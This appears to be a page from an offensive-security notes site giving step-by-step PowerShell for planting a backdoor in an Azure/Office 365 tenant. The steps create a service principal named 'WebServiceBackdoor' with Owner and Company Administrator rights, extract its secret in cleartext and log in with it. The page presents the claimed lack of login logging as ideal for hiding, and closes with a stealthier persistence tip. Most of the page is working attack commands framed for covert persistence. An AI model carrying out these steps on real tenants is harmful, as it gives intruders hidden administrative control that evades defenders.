# Service Principal Backdoor

## Service Principal Backdoor

Almost 200 SPN enabled by default on O365.

Service Principal are just account like any other accounts : can login using login/password.

**-** To create a Service Principal, a Global Admin(ie company admin account) must be used.

\- Service Principal login attempt are not logged on the interface:  just perfect for a backdoored account !

#### Global Admin account

* Create a new user and add a Global Admin role on it :

![](../../../../../.gitbook/assets/13c7afa4319d4d6fb1682ef0bc8f0706.png)

![](../../../../../.gitbook/assets/553697568c11436d884518a673810b2d.png)

* Then on the subscription IAM menu , add this account as the subscription owner

![](../../../../../.gitbook/assets/08c59ce714664727be919ec4652eccfb.png)

### Create a Service Principal

* Import the modules

```csharp
PS C:\Users\b3v1l\Desktop>Import-Module az PS C:\Users\b3v1l\Desktop> Import-Module MSOnline
```

* Login with the Global Admin account

```csharp
$cred = Get-Credential
```

![](../../../../../.gitbook/assets/2e2d9bbfcff64b3c8334e05e12310d88.png)

Then connect using the following commands

```csharp
Connect-AzAccount -Credential $cred 
Connect-MsolService -Credential $cred
```

![](../../../../../.gitbook/assets/b5704740761e4050a485754896a0e71f.png)

* Get the subscription ID&#x20;

```csharp
Get-AzSubscription
```

* In case of multi subscription in the same tenant, we can set the subscription ID using the following command :

```csharp
Set-AzContext -SubscriptionId REDACTED
```

![](../../../../../.gitbook/assets/aec92c67eaee4299ade0e94efc02ffbf.png)

* Create a new SPN
  * **Display** name will be listed on the **webconsole**.
  * ApplicationID = **username**

```csharp
$spn = New-AzAdServicePrincipal -DisplayName "WebServiceBackdoor" -Role Owner
```

![](../../../../../.gitbook/assets/06e1a9f3c4b845ab8657bf8d3b58602a.png)

* Get a unsecure SPN password (cleartext)

```csharp
$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($spn.Secret)
$UnsecureSecret = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
$UnsecureSecret
```

![](../../../../../.gitbook/assets/1b9674db1b1b46d0a93f30104e0aea41.png)

#### Set up an Admin Role on the SPN

```csharp
$sp = Get-MsolServicePrincipal -AppPrincipalId REDACTED
$role = Get-MsolRole -RoleName "Company Administrator"
Add-MsolRoleMember -RoleObjectId $role.ObjectId -RoleMemberType ServicePrincipal -RoleMemberObjectId $sp.ObjectId
```

![](../../../../../.gitbook/assets/60f14a3aa8db4c3da700713f96accf76.png)

* List Global Admin accounts

```csharp
Get-MsolRoleMember -RoleObjectId $role.ObjectId
```

![](../../../../../.gitbook/assets/f8e5dc266be64f0e93df303a81df319a.png)

### Login with the SPN account

```csharp
Import-Module Az $cred = Get-Credential
```

![](../../../../../.gitbook/assets/29da69bcc7a04a2b8ae63386cd108667.png)

```csharp
Connect-AzAccount -Credential $cred -Tenant â€œtenant ID" -ServicePrincipal
```

![](../../../../../.gitbook/assets/c5c806a281ae47a9af896c757ef4c700.png)

#### Note:

This can be noisy ...

A better way will be to add the SPN to the "User Account Administrator" group. This will allow the SPN to create new accounts to authenticate.
